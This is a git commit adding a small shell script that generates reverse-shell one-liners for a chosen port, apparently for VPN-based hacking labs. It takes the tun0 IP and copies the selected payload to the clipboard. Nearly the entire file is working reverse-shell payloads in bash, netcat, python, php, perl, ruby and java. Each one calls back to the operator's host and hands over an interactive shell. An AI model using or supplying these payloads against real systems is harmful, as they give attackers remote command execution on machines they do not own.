cf7ade50ed3ed98a72b16ad14880cac16e0bf023
M4t35Z <M4t35Z@protonmail.com>
2020-06-15 23:29:35 +0200

    Revshell 1liner generator HELPS A LOT I PROMISE :D

---
+++ revshellgen.sh
@@ -0,0 +1,56 @@
+#!/bin/sh
+
+# -- Just a dmenu wrapper --
+# It just needs a port and a revshell type
+# and u get a revshell with ur tun0 ip and
+# the port u set
+# Created by M4t35Z
+
+
+setup() {
+    tun0_ip=$(ip addr show tun0 2> /dev/null | grep -Po 'inet \K[\d.]+')
+    echo $tun0_ip
+    
+    port="$($1 | dmenu -p "Gimme a port u wanna listen on")"
+    echo $port
+}
+
+revshellz() {
+    case "$(printf "bash\\nnc(long)\\nnc(-e)\\npython\\nphp\\nperl\\nruby\\njava" | dmenu -i -p "R3vSh3LLZ")" in
+
+        "bash") echo -n \
+            "bash -i >& /dev/tcp/$tun0_ip/$port 0>&1" \
+            | xclip -selection clipboard ;;
+
+        "nc(long)") echo -n \
+            "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $tun0_ip $port >/tmp/f" \
+            | xclip -selection clipboard ;;
+
+        "nc(-e)") echo -n \
+            "nc -e /bin/sh $tun0_ip $port" \
+            | xclip -selection clipboard ;;
+
+        "python") echo -n \
+            "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("\""$tun0_ip"\"",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["\""/bin/sh"\"","\""-i"\""]);'" \
+            | xclip -selection clipboard ;;
+
+        "php") echo -n \
+            "php -r '\$sock=fsockopen("\""$tun0_ip"\"",$port);exec("\""/bin/sh -i <&3 >&3 2>&3"\"");'" \
+            | xclip -selection clipboard ;;
+
+        "perl") echo -n \
+            "perl -e 'use Socket;\$i="\""$tun0_ip"\"";\$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname("\""tcp"\""));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,"\"">&S"\"");open(STDOUT,"\"">&S"\"");open(STDERR,"\"">&S"\"");exec("\""/bin/sh -i"\"");};'" \
+            | xclip -selection clipboard ;;
+
+        "ruby") echo -n \
+            "ruby -rsocket -e'f=TCPSocket.open("\""$tun0_ip"\"",$port).to_i;exec sprintf("\""/bin/sh -i <&%d >&%d 2>&%d"\"",f,f,f)'" \
+            | xclip -selection clipboard ;;
+
+        "java") echo -n \
+            "r = Runtime.getRuntime()\np = r.exec(["\""/bin/bash"\"","\""-c"\"","\""exec 5<>/dev/tcp/$tun0_ip/$port;cat <&5 | while read line; do \$line 2>&5 >&5; done"\""] as String[])\np.waitFor()" \
+            | xclip -selection clipboard ;;
+    esac
+}
+
+setup
+revshellz
